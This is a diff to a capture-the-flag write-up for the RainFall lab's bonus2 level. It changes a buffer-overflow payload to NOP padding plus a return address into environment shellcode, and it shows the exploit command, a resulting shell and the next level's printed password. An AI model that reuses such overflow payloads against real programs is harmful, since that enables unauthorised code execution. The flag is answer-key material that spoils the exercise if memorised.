@@ -140,14 +140,14 @@ Alright, let's craft our payload:
 arg1 = padding of 40 bytes
 arg2 = padding of 23 bytes + address of the shellcode in the env
 
-arg1 = A * 40
-arg2 = B * 23 + "\xbf\xff\xf8\x48"
+arg1 = "\x90" * 40
+arg2 = "\x90" * 23 + "\xbf\xff\xf8\x48"
 ```
 
 Let's run it:
 ```bash
-bonus2@RainFall:~$ ./bonus2 `python -c 'print "A"*40'` `python -c 'print "B"*23 + "\xbf\xff\xf8\x48"[::-1]'`
-Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBQ���
+bonus2@RainFall:~$ ./bonus2 `python -c 'print "\x90"*40'` `python -c 'print "\x90"*23 + "\xbf\xff\xf8\x48"[::-1]'`
+Goedemiddag! ���������������������������������������������������������������H���
 $ cat /home/user/bonus3/.pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 ```
